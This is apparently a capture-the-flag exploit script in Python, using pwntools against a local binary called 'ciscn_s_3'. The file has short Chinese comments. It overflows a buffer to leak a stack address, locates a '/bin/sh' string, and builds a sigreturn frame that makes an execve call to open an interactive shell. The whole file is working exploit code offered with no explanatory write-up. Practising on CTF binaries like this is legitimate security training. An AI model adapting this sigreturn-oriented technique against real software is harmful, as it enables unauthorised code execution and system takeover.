#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()


p = process('./ciscn_s_3')

#sigreturn_addr
mov_rax_0xf_ret = 0x4004da #mov rax, 0xf; ret

syscall_ret = 0x400501
vuln = 0x4004ed

# gdb.attach(p)
# pause()
payload = '/bin/sh\x00'*2 + p64(vuln) #再执行一次输入
p.sendline(payload)

p.recv(0x20)
binsh_addr = u64(p.recv(8)) - 280

frame = SigreturnFrame()
frame.rax = constants.SYS_execve #存放系统调用号
frame.rdi = binsh_addr #1 参数
frame.rsi = 0 	#2参数
frame.rdx = 0   #3参数
frame.rip = syscall_ret

#执行 sigreturn 调用
paylaod = '/bin/sh\x00'*2 + p64(mov_rax_0xf_ret) + p64(syscall_ret) + str(frame)
p.sendline(paylaod)

p.interactive()

